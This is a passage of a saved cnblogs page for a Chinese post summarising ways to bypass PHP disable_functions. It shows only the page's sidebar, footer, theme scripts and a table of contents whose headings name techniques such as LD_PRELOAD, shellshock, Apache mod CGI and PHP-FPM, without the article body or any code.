+<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: &#39;&#39;, targetType: &#39;blogPost&#39;, targetId: &#39;15055907&#39;, targetLink: &#39;https://www.cnblogs.com/sakura521/p/15055907.html&#39;, title: &#39;php disable_functions绕过总结&#39; })">举报</a>
+</div>
+        </div>
+	    
+	    
+    </div><!--end: topics 文章、评论容器-->
+</div>
+
+<script>
+    var cb_entryId = 15055907, cb_entryCreatedDate = '2021-07-24 23:36', cb_postType = 1, cb_postTitle = 'php disable_functions绕过总结';
+    var allowComments = true, cb_blogId = 563617, cb_blogApp = 'sakura521', cb_blogUserGuid = '03047725-dc1f-421a-aedf-08d7709b037e';
+    mermaidRender.render()
+    markdown_highlight()
+    zoomManager.apply("#cnblogs_post_body img:not(.code_img_closed):not(.code_img_opened)");
+    updatePostStats(
+            [cb_entryId],
+            function(id, count) { $("#post_view_count").text(count) },
+            function(id, count) { $("#post_comment_count").text(count) });
+</script>
+<a id="!comments"></a>
+<div id="blog-comments-placeholder"></div>
+<div id="comment_form" class="commentform">
+    <a name="commentform"></a>
+    <div id="divCommentShow"></div>
+    <div id="comment_nav"><span id="span_refresh_tips"></span><a href="javascript:void(0);" onclick="return RefreshCommentList();" id="lnk_RefreshComments" runat="server" clientidmode="Static">刷新评论</a><a href="https://www.cnblogs.com/sakura521/p/15055907.html#" onclick="return RefreshPage();">刷新页面</a><a href="https://www.cnblogs.com/sakura521/p/15055907.html#top">返回顶部</a></div>
+    <div id="comment_form_container" style="visibility: visible;"><div class="login_tips">
+    登录后才能查看或发表评论，立即 <a rel="nofollow" href="javascript:void(0);" class="underline" onclick="return account.login(&#39;!comments&#39;);">登录</a> 或者
+    <a href="https://www.cnblogs.com/">逛逛</a> 博客园首页
+</div>
+</div>
+    <div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+        <div id="cnblogs_ch"></div>
+    <div id="opt_under_post"></div>
+    <div id="cnblogs_c1" class="under-post-card" style="display: none;">
+            <div id="div-gpt-ad-1592365906576-0" style="width: 300px; height: 250px;"></div>
+    </div>
+    <div id="under_post_card1"><div class="under-post-card">
+<b>编辑推荐：</b>
+<br>
+
+· <a href="https://www.cnblogs.com/eventhorizon/p/17497359.html" target="_blank"> 如何在 long-running task 中调用 async 方法 </a>
+    <br>
+· <a href="https://www.cnblogs.com/coco1s/p/17495560.html" target="_blank">单标签下的日间/黑夜模式切换按钮效果</a>
+    <br>
+· <a href="https://www.cnblogs.com/tcjiaan/p/17487725.html" target="_blank">「.NET深呼吸」用代码写 WPF 控件模板</a>
+    <br>
+· <a href="https://www.cnblogs.com/jevonsflash/p/17489161.html" target="_blank">[MAUI]弧形进度条与弧形滑块的交互实现</a>
+    <br>
+· <a href="https://www.cnblogs.com/huangxincheng/p/17483537.html" target="_blank"> 记一次 .NET 某药材管理系统 卡死分析 </a>
+    <br>
+</div></div>
+    <div id="under_post_card2"><div class="itnews under-post-card">
+    <b>阅读排行：</b>
+    <br>
+ ·          <a href="https://www.cnblogs.com/cmt/p/17497412.html" target="_blank">【网站公告】园子被处罚，请大家不要发布/转载任何网络小说</a>
+        <br>
+ ·          <a href="https://www.cnblogs.com/chingho/p/17486465.html" target="_blank">适合Windows桌面、Material Design设计风格、WPF美观控件库【强烈推荐】</a>
+        <br>
+ ·          <a href="https://www.cnblogs.com/eventhorizon/p/17497359.html" target="_blank">如何在long-running task中调用async方法</a>
+        <br>
+ ·          <a href="https://www.cnblogs.com/tangyanzhi1111/p/17489381.html" target="_blank">C#/.Net的多播委托到底是啥？彻底剖析下</a>
+        <br>
+ ·          <a href="https://www.cnblogs.com/hejiale010426/p/17498629.html" target="_blank">如何取消Blazor Server烦人的重新连接？</a>
+        <br>
+</div></div>
+    <div id="HistoryToday" class="under-post-card"></div>
+    <script type="text/javascript">
+        var commentManager = new blogCommentManager();
+        commentManager.renderComments(0);
+        fixPostBody();
+        window.footnoteTipManager.generateFootnoteTips();
+
+            window.tocManager.displayDisableTocTips = false;
+            window.tocManager.generateToc();
+            
+                setTimeout(function() { countViews(cb_blogId, cb_entryId); }, 50);
+            
+            deliverT2();
+            deliverC1C2();
+            loadNewsAndKb();
+            
+                LoadPostCategoriesTags(cb_blogId, cb_entryId);
+            
+            LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+            GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType);
+            loadOptUnderPost();
+            GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);
+                </script>
+</div>
+
+	</div><!--end: forFlow -->
+	</div><!--end: mainContent 主体内容容器-->
+	<div id="sideBar">
+		<div id="sideBarMain"><img class="esa-profile-avatar" src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/20210522142946(1).png">
+			<div id="sidebar_news" class="newsItem">
+    <h3 class="catListTitle">公告</h3>
+<div id="blog-news">    
+    <div id="sidebar_news_content"><script type="text/javascript">window['__document_write_ajax_callbacks__']['4']();</script><script>window['__document_write_ajax_callbacks__']['1']();</script>
+<script type="text/javascript">window['__document_write_ajax_callbacks__']['5']();</script><script type="text/javascript">window['__document_write_ajax_callbacks__']['6']();</script><script>window['__document_write_ajax_callbacks__']['2']();</script>
+
+<div id="profile_block">
+    昵称：
+    <a href="https://home.cnblogs.com/u/sakura521/">
+        Ctrl_C+Ctrl_V
+    </a>
+    <br>
+    园龄：
+    <a href="https://home.cnblogs.com/u/sakura521/" title="入园时间：2019-11-25">
+        3年6个月
+    </a>
+    <br>
+    粉丝：
+    <a class="follower-count" href="https://home.cnblogs.com/u/sakura521/followers/">
+        17
+    </a>
+    <br>
+    关注：
+    <a class="folowing-count" href="https://home.cnblogs.com/u/sakura521/followees/">
+        2
+    </a>
+    <div id="p_b_follow" class="follow-tip">
+<a href="javascript:void(0)" onclick="follow(&#39;03047725-dc1f-421a-aedf-08d7709b037e&#39;)">+加关注</a></div>
+    <script type="text/javascript">window['__document_write_ajax_callbacks__']['7']();</script><script>window['__document_write_ajax_callbacks__']['3']();</script>
+</div>
+</div>
+</div>
+<script>loadBlogNews();</script>
+
+ 
+</div>
+<div id="sidebar_c3"></div>
+			<div id="blog-calendar" style="">
+
+<table id="blogCalendar" class="Cal" cellspacing="0" cellpadding="0" title="Calendar" border="0">
+    <tbody>
+        <tr>
+            <td colspan="7">
+                <table class="CalTitle" cellspacing="0" border="0">
+                    <tbody>
+                        <tr>
+                            <td class="CalNextPrev">
+                                <a href="javascript:void(0);" onclick="loadBlogCalendar(&#39;2023/05/23&#39;); return false;">&lt;</a>
+                            </td>
+                            <td align="center">2023年6月</td>
+                            <td align="right" class="CalNextPrev">
+                                <a href="javascript:void(0);" onclick="loadBlogCalendar(&#39;2023/07/23&#39;); return false;">&gt;</a>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </td>
+        </tr>
+    <tr>
+        <th class="CalDayHeader" align="center" abbr="日" scope="col">日</th>
+        <th class="CalDayHeader" align="center" abbr="一" scope="col">一</th>
+        <th class="CalDayHeader" align="center" abbr="二" scope="col">二</th>
+        <th class="CalDayHeader" align="center" abbr="三" scope="col">三</th>
+        <th class="CalDayHeader" align="center" abbr="四" scope="col">四</th>
+        <th class="CalDayHeader" align="center" abbr="五" scope="col">五</th>
+        <th class="CalDayHeader" align="center" abbr="六" scope="col">六</th>
+    </tr>
+            <tr>
+                            <td class="CalOtherMonthDay" align="center">28</td>
+                            <td class="CalOtherMonthDay" align="center">29</td>
+                            <td class="CalOtherMonthDay" align="center">30</td>
+                            <td class="CalOtherMonthDay" align="center">31</td>
+                        <td class="" align="center">
+                            1
+                        </td>
+                        <td class="" align="center">
+                            2
+                        </td>
+                    <td class="CalWeekendDay" align="center">
+                        3
+                    </td>
+            </tr>
+                <tr>
+                        <td class="CalWeekendDay" align="center">
+                            4
+                        </td>
+                            <td class="" align="center">
+                                5
+                            </td>
+                            <td class="" align="center">
+                                6
+                            </td>
+                            <td class="" align="center">
+                                7
+                            </td>
+                            <td class="" align="center">
+                                8
+                            </td>
+                            <td class="" align="center">
+                                9
+                            </td>
+                        <td class="CalWeekendDay" align="center">
+                            10
+                        </td>
+                </tr>
+                <tr>
+                        <td class="CalWeekendDay" align="center">
+                            11
+                        </td>
+                            <td class="" align="center">
+                                12
+                            </td>
+                            <td class="" align="center">
+                                13
+                            </td>
+                            <td class="" align="center">
+                                14
+                            </td>
+                            <td class="" align="center">
+                                15
+                            </td>
+                            <td class="" align="center">
+                                16
+                            </td>
+                        <td class="CalWeekendDay" align="center">
+                            17
+                        </td>
+                </tr>
+                <tr>
+                        <td class="CalWeekendDay" align="center">
+                            18
+                        </td>
+                            <td class="" align="center">
+                                19
+                            </td>
+                            <td class="" align="center">
+                                20
+                            </td>
+                            <td class="" align="center">
+                                21
+                            </td>
+                            <td class="" align="center">
+                                22
+                            </td>
+                            <td class="CalTodayDay" align="center">
+                                23
+                            </td>
+                        <td class="CalWeekendDay" align="center">
+                            24
+                        </td>
+                </tr>
+                <tr>
+                        <td class="CalWeekendDay" align="center">
+                            25
+                        </td>
+                            <td class="" align="center">
+                                26
+                            </td>
+                            <td class="" align="center">
+                                27
+                            </td>
+                            <td class="" align="center">
+                                28
+                            </td>
+                            <td class="" align="center">
+                                29
+                            </td>
+                            <td class="" align="center">
+                                30
+                            </td>
+                        <td class="CalOtherMonthDay" align="center">
+                            1
+                        </td>
+                </tr>
+                <tr>
+                        <td class="CalOtherMonthDay" align="center">
+                            2
+                        </td>
+                            <td class="CalOtherMonthDay" align="center">
+                                3
+                            </td>
+                            <td class="CalOtherMonthDay" align="center">
+                                4
+                            </td>
+                            <td class="CalOtherMonthDay" align="center">
+                                5
+                            </td>
+                            <td class="CalOtherMonthDay" align="center">
+                                6
+                            </td>
+                            <td class="CalOtherMonthDay" align="center">
+                                7
+                            </td>
+                        <td class="CalOtherMonthDay" align="center">
+                            8
+                        </td>
+                </tr>
+    </tbody>
+</table></div><script>loadBlogDefaultCalendar();</script>			
+			<div id="leftcontentcontainer">
+				<div id="blog-sidecolumn"><!-- 搜索 -->
+<div id="sidebar_search" class="sidebar-block">
+    <div id="sidebar_search" class="mySearch">
+        <h3 class="catListTitle">搜索</h3>
+        <div id="sidebar_search_box">
+            <div id="widget_my_zzk" class="div_my_zzk">
+                <input type="text" id="q" onkeydown="return zzk_go_enter(event);" class="input_my_zzk">&nbsp;<input onclick="zzk_go()" type="button" value="找找看" id="btnZzk" class="btn_my_zzk">
+            </div>
+            
+        </div>
+    </div>
+</div>
+
+<!-- 常用链接 -->
+
+
+<!-- 最新随笔 -->
+<div id="sidebar_recentposts" class="sidebar-block"><div class="catListEssay">
+<h3 class="catListTitle">最新随笔</h3>
+    <ul>
+                <li>
+                    
+<a href="https://www.cnblogs.com/sakura521/p/16134581.html">1.Java代码审计学习笔记(四)</a>
+
+                </li>
+                <li>
+                    
+<a href="https://www.cnblogs.com/sakura521/p/15854587.html">2.第17章 内存映射文件学习笔记</a>
+
+                </li>
+                <li>
+                    
+<a href="https://www.cnblogs.com/sakura521/p/15853334.html">3.第13章 Windows内存体系结构学习笔记</a>
+
+                </li>
+                <li>
+                    
+<a href="https://www.cnblogs.com/sakura521/p/15834416.html">4.java代码审计学习笔记(二)</a>
+
+                </li>
+                <li>
+                    
+<a href="https://www.cnblogs.com/sakura521/p/15824631.html">5.java代码审计学习笔记(一)</a>
+
+                </li>
+                <li>
+                    
+<a href="https://www.cnblogs.com/sakura521/p/15678040.html">6.shellcode免杀思路</a>
+
+                </li>
+                <li>
+                    
+<a href="https://www.cnblogs.com/sakura521/p/15678022.html">7.syscall调用原理</a>
+
+                </li>
+                <li>
+                    
+<a href="https://www.cnblogs.com/sakura521/p/15678000.html">8.免杀基础总结---杀软常用查杀说明</a>
+
+                </li>
+                <li>
+                    
+<a href="https://www.cnblogs.com/sakura521/p/15659211.html">9.第七章 隐藏技术---DLL劫持</a>
+
+                </li>
+                <li>
+                    
+<a href="https://www.cnblogs.com/sakura521/p/15610094.html">10.hosts碰撞</a>
+
+                </li>
+    </ul>
+</div>
+
+</div>
+
+<!-- 我的标签 -->
+<div id="sidebar_toptags" class="sidebar-block"></div>
+
+<!-- 积分与排名 -->
+
+
+<!-- 随笔分类、随笔档案、文章分类、新闻分类、相册、链接 -->
+<div id="sidebar_categories">
+
+    <div id="sidebar_postcategory" class="catListPostCategory sidebar-block">
+        <h3 class="catListTitle">
+            
+    <a class="sidebar-card-title-a" href="https://www.cnblogs.com/sakura521/post-categories">随笔分类</a>
+
+
+
+        </h3>
+
+        <ul>
+
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/sakura521/category/1978638.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">Web安全(20)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/sakura521/category/2021431.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">Windows核心编程(3)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/sakura521/category/2022044.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">Windows黑客编程技术详解(13)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/sakura521/category/1978649.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">代码审计(4)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/sakura521/category/2020298.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">痕迹清除(5)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/sakura521/category/2020297.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">横向移动(1)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/sakura521/category/1978648.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">经验分享(5)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/sakura521/category/1995290.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">漏洞复现(6)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/sakura521/category/2020294.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">密码获取(3)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/sakura521/category/1978650.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">免杀实践(5)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/sakura521/category/2051702.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">内网信息收集(4)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/sakura521/category/2020296.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">权限提升(5)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/sakura521/category/2020295.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">权限维持(1)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/sakura521/category/2020304.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">隧道通信(1)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/sakura521/category/1991066.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">网络钓鱼(4)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/sakura521/category/1978639.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">应急响应(1)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/sakura521/category/2020301.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">域控安全(1)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/sakura521/category/1995050.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">资产信息收集(4)</a>
+ 
+                </li>                
+            
+        </ul>
+
+
+    </div>    
+    <div id="sidebar_articlecategory" class="catListArticleCategory sidebar-block">
+        <h3 class="catListTitle">
+            
+    <a class="sidebar-card-title-a" href="https://www.cnblogs.com/sakura521/article-categories">文章分类</a>
+
+
+
+        </h3>
+
+        <ul>
+
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/sakura521/category/2040817.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">web渗透基础知识(3)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/sakura521/category/2086317.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">windows理解(2)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/sakura521/category/2003788.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">业务逻辑漏洞挖掘(1)</a>
+ 
+                </li>                
+                <li data-category-list-item-visible="true" style="display: block">
+                    
+<a href="https://www.cnblogs.com/sakura521/category/2014229.html" style="--cnb-category-item-link-indent-size: calc(0 * 1em)" class="category-item-link" rel="" target="">域渗透基础知识(14)</a>
+ 
+                </li>                
+            
+        </ul>
+
+
+    </div>    
+</div>
+
+<!-- 最新评论 -->
+<!-- 阅读排行榜 -->
+
+
+<!-- 评论排行榜 -->
+
+
+<!-- 推荐排行榜 --><div id="sidebar_recentcomments" class="sidebar-block"><div class="catListComment">
+<h3 class="catListTitle"><a href="https://www.cnblogs.com/sakura521/comments" class="sidebar-card-title-a">最新评论</a></h3>
+    <div class="RecentCommentBlock">
+        <ul>
+                <li class="recent_comment_title"><a href="https://www.cnblogs.com/sakura521/p/14952518.html">1. Re:XSS水坑钓鱼</a></li>
+                <li class="recent_comment_body"><p>哥 你这几篇文章还不错  一下就让我醍醐灌顶了</p>
+</li>
+                <li class="recent_comment_author">--这醋好甜</li>
+                <li class="recent_comment_title"><a href="https://www.cnblogs.com/sakura521/p/14952518.html">2. Re:XSS水坑钓鱼</a></li>
+                <li class="recent_comment_body"><p>城哥牛逼</p>
+</li>
+                <li class="recent_comment_author">--joker0xxx3</li>
+        </ul>
+    </div>
+</div>
+
+</div>
+
+
+</div>
+                    <script>loadBlogSideColumn();</script>
+			</div>			
+		</div><!--end: sideBarMain -->
+	</div><!--end: sideBar 侧边栏容器 -->
+	<div class="clear"></div>
+	</div><!--end: main -->
+	<div class="clear"></div>
+	<div id="footer">
+		<!--done-->
+Copyright © 2023 Ctrl_C+Ctrl_V
+<br><span id="poweredby">Powered by .NET 7.0 on Kubernetes</span>
+
+
+
+	<span class="esa-copyright">&amp; Theme <a href="https://github.com/esofar/cnblogs-theme-silence" target="_blank">Silence v3.0.0</a></span></div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+
+
+
+    
+
+    <input type="hidden" id="antiforgery_token" value="CfDJ8DuWIYDefEVJtUW7VadsHY_QaxEGgQi_qGE1W9xNBnu2S0EYupTTpd0dCWiSRr6Ic6cArucNdiLdOqF1SRvXr87niF-cbQgwntlIhul_FADL38lCdkF1SEwM0134esIl62fHt705EefORG9ZMZ2NfPE">
+    <script async="" src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/js"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    var kv = getGACustom();
+    if (kv) {
+        gtag('set', kv);
+    }
+    gtag('config', 'UA-476124-1');
+</script>
+<script defer="" src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/hm.js.下载"></script>
+
+<script type="text/javascript">
+        window.$silence = {
+            avatar: 'https://pic.cnblogs.com/avatar/1879842/20210522142946.png',
+            favicon: 'https://blog-static.cnblogs.com/files/blogs/563617/logo.ico',
+            github:  'https://github.com/voiceheart?tab=repositories',
+            defaultMode: 'dark',
+            defaultTheme: 'b',
+            showNavAdmin: true,
+            hljsln: true,
+            navbars: [{
+                title: '标签',
+                target: '_blank',
+                url: 'https://github.com/esofar/cnblogs-theme-silence/'
+            }],
+            catalog: {
+                enable: true,
+                index: true,
+                active: false,
+                levels: ['h2', 'h3', 'h4'],
+            },
+            signature: {
+                enable: true,
+                author: null,
+                license: ['署名-非商业性使用-相同方式共享 4.0 国际', 'https://creativecommons.org/licenses/by-nc-sa/4.0/。'],
+                remark: ['本文所有内容仅可用于学习和交流，如用于非法活动一切责任与本站无关且后果自负。'],
+            },
+            sponsor: {
+                enable: true,
+                text: '本文所有内容仅可用于学习和交流，如用于非法活动一切责任与本站无关且后果自负',
+                paypal: null,
+                wechat: 'https://images.cnblogs.com/cnblogs_com/blogs/563617/galleries/1828005/o_210522143358111.png',
+                alipay: ''
+           },
+       };
+   </script><a href="https://github.com/voiceheart?tab=repositories" class="github-corner" title="GitHub" target="_blank">
+                <svg width="60" height="60" viewBox="0 0 250 250" style="color:#fff" aria-hidden="true">
+                    <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+                    <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+                    <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path>
+                </svg>
+            </a><div class="esa-toolbar">
+        <div class="bars bars-show"><i class="fa fa-ellipsis-h"></i></div>
+        <span class="up up-show" title="返回顶部"><i class="fa fa-chevron-up"></i></span>
+        <span class="mode mode-show" title="切换模式"><i class="fa fa-adjust"></i></span>
+        <span class="skin skin-show" title="主题设置"><i class="fa fa-cog"></i></span>
+        <div class="skin-popup">
+            <div class="item">
+                <div class="title">主题色彩</div>
+                <div class="themes">
+                    <button data-theme="a" style="background: #2D8CF0;"></button>
+                    <button data-theme="b" style="background: #FA7298;"></button>
+                    <button data-theme="c" style="background: #42B983;"></button>
+                    <button data-theme="d" style="background: #607D8B;"></button>
+                    <button data-theme="e" style="background: #5E72E4;"></button>
+                    <button data-theme="f" style="background: #FF9700;"></button>
+                    <button data-theme="g" style="background: #FF5722;"></button>
+                    <button data-theme="h" style="background: #009688;"></button>
+                    <button data-theme="i" style="background: #673BB7;"></button>
+                    <button data-theme="j" style="background: #906f61;"></button>
+                </div>
+            </div>
+        </div>
+        <span class="contents contents-show" title="阅读目录"><i class="fa fa-list-ul"></i></span></div>
+    <div class="esa-contents noactive"><ul><li class="h3" title="零、php需要禁用的函数">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#%E9%9B%B6php%E9%9C%80%E8%A6%81%E7%A6%81%E7%94%A8%E7%9A%84%E5%87%BD%E6%95%B0"><span class="level2">0.1. </span>零、php需要禁用的函数</a>
+                 </li><li class="h3" title="一、常规绕过">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#%E4%B8%80%E5%B8%B8%E8%A7%84%E7%BB%95%E8%BF%87"><span class="level2">0.2. </span>一、常规绕过</a>
+                 </li><li class="h3" title="二、利用环境变量LD_PRELOAD绕过">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#%E4%BA%8C%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fld_preload%E7%BB%95%E8%BF%87"><span class="level2">0.3. </span>二、利用环境变量LD_PRELOAD绕过</a>
+                 </li><li class="h4" title="1、mail">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#1mail"><span class="level3">0.3.1. </span>1、mail</a>
+                 </li><li class="h4" title="2、error_log">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#2error_log"><span class="level3">0.3.2. </span>2、error_log</a>
+                 </li><li class="h4" title="3、mb_send_mail">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#3mb_send_mail"><span class="level3">0.3.3. </span>3、mb_send_mail</a>
+                 </li><li class="h4" title="4、可以利用蚁剑插件(绕过disable_functions)">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#4%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E7%BB%95%E8%BF%87disable_functions"><span class="level3">0.3.4. </span>4、可以利用蚁剑插件(绕过disable_functions)</a>
+                 </li><li class="h3" title="三、shellshock">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#%E4%B8%89shellshock"><span class="level2">0.4. </span>三、shellshock</a>
+                 </li><li class="h4" title="1、漏洞说明传送门">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#1%E6%BC%8F%E6%B4%9E%E8%AF%B4%E6%98%8E%E4%BC%A0%E9%80%81%E9%97%A8"><span class="level3">0.4.1. </span>1、漏洞说明传送门</a>
+                 </li><li class="h4" title="2、漏洞环境">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#2%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="level3">0.4.2. </span>2、漏洞环境</a>
+                 </li><li class="h4" title="3、php脚本调用">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#3php%E8%84%9A%E6%9C%AC%E8%B0%83%E7%94%A8"><span class="level3">0.4.3. </span>3、php脚本调用</a>
+                 </li><li class="h3" title="四、Apache Mod CGI">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#%E5%9B%9Bapache-mod-cgi"><span class="level2">0.5. </span>四、Apache Mod CGI</a>
+                 </li><li class="h4" title="1、简单说明">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#1%E7%AE%80%E5%8D%95%E8%AF%B4%E6%98%8E"><span class="level3">0.5.1. </span>1、简单说明</a>
+                 </li><li class="h4" title="2、使用条件">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#2%E4%BD%BF%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="level3">0.5.2. </span>2、使用条件</a>
+                 </li><li class="h4" title="3、漏洞环境">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#3%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="level3">0.5.3. </span>3、漏洞环境</a>
+                 </li><li class="h4" title="4、蚁剑插件">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#4%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6"><span class="level3">0.5.4. </span>4、蚁剑插件</a>
+                 </li><li class="h4" title="5、反弹shell的EXP">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#5%E5%8F%8D%E5%BC%B9shell%E7%9A%84exp"><span class="level3">0.5.5. </span>5、反弹shell的EXP</a>
+                 </li><li class="h3" title="五、PHP-FPM">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#%E4%BA%94php-fpm"><span class="level2">0.6. </span>五、PHP-FPM</a>
+                 </li><li class="h4" title="1、漏洞原理">
+                    <a class="esa-anchor-link" href="https://www.cnblogs.com/sakura521/p/15055907.html#1%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="level3">0.6.1. </span>1、漏洞原理</a>
+                 </li><li class="h4" title="2、漏洞环境">
